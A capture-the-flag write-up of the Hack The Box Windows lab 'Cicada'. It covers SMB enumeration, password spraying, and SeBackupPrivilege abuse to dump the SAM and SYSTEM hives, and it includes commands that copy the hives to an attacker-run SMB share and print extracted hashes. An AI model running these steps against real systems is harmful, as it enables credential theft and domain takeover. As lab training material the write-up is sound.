---
title: HTB Cicada
date: 2024-11-12 08:50:00 +/-TTTT
categories: [Hackthebox, Windows]
tags: [smb, secretsdump, sebackupprivilege]     # TAG names should always be lowercase
description: SMB enumeration revealed credentials, enabling deeper access. Using SeBackupPrivilege, SAM and SYSTEM files were dumped, revealing hashes and granting admin access for root flag.

image:
  path: assets\cicada\cropped-box-cicada.png
---







## Introduction
The target machine, `CICADA-DC.cicada.htb`, presents a scenario of Active Directory exploitation and privilege escalation. Initial reconnaissance using Nmap revealed common services, including LDAP, SMB, and Kerberos, indicating its a domain controller.

Through SMB enumeration credentials were obtained, enabling further authenticated enumeration. Exploiting `SeBackupPrivilege`, sensitive files (`SAM` and `SYSTEM`) were extracted and analyzed using tools like Impacket’s `secretsdump.py`, revealing password hashes. This led to full admin access and the root flag.

---
## Initial Enumeration

### Nmap Scan
```sh
nmap -sCV 10.10.11.35         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 04:22 UTC
Nmap scan report for 10.10.11.35
Host is up (0.014s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Initial Nmap Scan Findings:
-  LDAP on ports 389, 636, and 3268/3269 (over SSL).
-  SMB shares on port 445.
-  Kerberos on port 88, indicating Active Directory is in use.
-  CICADA-DC cicada.htb CICADA-DC.cicada.htb

### Fullport scan
This revealed the same ports

---
#### Port 135 RPC
```sh
rpcclient -N -U "" //10.10.11.35 
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> ^C
```
Got access denied on with a null session.

---
#### Port 3269
I navigated in the browser to `https://cicada.htb:3269/` and viewed the ssl cert:
![alt text](assets\cicada\cicada1.png)
- It looks like this host might be a certificate authority


---
### Port 445 smb
```sh
smbclient -N -L //10.10.11.35   

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```
We see there are `HR` and `DEV` shares, which are not default.

```sh
smb: \> ls
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 17:31:48 2024

smb: \> get "Notice from HR.txt"

getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (21.3 KiloBytes/sec) (average 21.3 KiloBytes/sec)
```
This file came with some credentials inside:
##### Creds
```
Cicada$M6Corpb*@Lp#nZp!8
```

Since we have a password we can try to enumerate usernames using netexec:
```sh
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute
```


```sh
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

For additional enumeration ran `enum4linux`:
```sh
enum4linux -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```
> Found new users and another pasword for david, they will be added to the user & password lists. 

With these credentials I managed to connect to the DEV SMB share:
![alt text](assets\cicada\cicada2.png)
This bakup script contained credentials again:
![alt](assets\cicada\cicada3.png)

---
## Initial access
Finally with these credentials I managed to get a shell using WINRM
![image](assets\cicada\cicada4.png)
Next I used evil-wirm to connect with the target, and the first thing i checked was `whoami /priv`, which reveals that i have the `SeBackupPrivilege` since this privilge is often used for privilege escalation it is a good finding. 
![Pasted](assets\cicada\cicada5.png)

---
### Privilege escalation
Within the spawning directory there were 2 valuable files that can be used for privilege escalation `sam` and `system`, so I saved these files with the following commands since I had the backup privileges:
```powershell
reg.exe save hklm\sam C:\sam.save
```
```powershell
reg.exe save hklm\system C:\system.save
```
Then I started an Impacket smbserver to transfer the files from Windows to linux:
```sh
smbserver.py hacker ./ -smb2support -username 'lol' -password 'lol'
```
Connected to the share: 
```powershell
net use n: \\10.10.14.3\hacker /user:lol lol
```
Transferred the files:
```powershell
move sam.save \\10.10.14.3\hacker
```
```powershell
move system.save \\10.10.14.3\hacker
```

Now with these files on my system I was able to run another impacket tool `secretsdump.py` with the following command:
```sh
secretsdump.py -sam sam.save -system system.save local
---

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
```
Finally with the second part of the administrator hash i was able to evil-winrm to the admin. for the root flag. 

---
## Root flag
Evil-WinRm with the hash to get the root flag.
